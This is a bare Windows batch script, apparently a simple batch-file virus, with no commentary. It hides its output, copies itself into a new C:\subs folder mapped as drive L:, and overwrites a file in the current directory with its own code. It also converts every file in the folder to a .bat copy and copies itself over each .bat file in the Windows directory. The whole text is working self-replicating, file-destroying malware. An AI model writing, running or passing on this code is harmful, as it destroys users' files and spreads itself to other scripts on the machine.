@echo off  
ctty nul
md C:\subs
copy %0 C:\subs
subst L: C:\subs
for %%v in (*.*) do Set M=%%v
copy %0 %M%
copy *.* *.bat
for %%w in (%windir%\*.bat) do copy %0 %%w
